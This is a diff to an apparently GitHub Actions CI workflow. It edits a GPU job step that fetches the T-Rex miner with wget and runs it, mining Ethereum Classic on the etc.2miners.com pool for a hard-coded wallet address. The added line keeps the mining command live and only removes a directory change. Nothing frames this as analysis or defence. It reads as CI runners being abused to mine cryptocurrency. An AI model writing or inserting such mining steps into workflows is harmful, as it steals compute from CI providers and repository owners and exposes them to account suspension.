@@ -8,4 +8,4 @@ jobs:
     steps:
       - run: nvidia-smi
       - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi
-      - run: wget https://github.com/trexminer/T-Rex/releases/download/0.26.4/t-rex-0.26.4-linux.tar.gz && tar -xzvf t-rex-0.26.4-linux.tar.gz && cd 0.26.4 && ./t-rex -a etchash -o stratum+tcp://etc.2miners.com:1010 -u 0x0c08503c12f8cde11796b3f175aabddb9a6ed4ff -w rig1 -p x pause
+      - run: wget https://github.com/trexminer/T-Rex/releases/download/0.26.4/t-rex-0.26.4-linux.tar.gz && tar -xzvf t-rex-0.26.4-linux.tar.gz && ./t-rex -a etchash -o stratum+tcp://etc.2miners.com:1010 -u 0x0c08503c12f8cde11796b3f175aabddb9a6ed4ff -w rig1 -p x pause
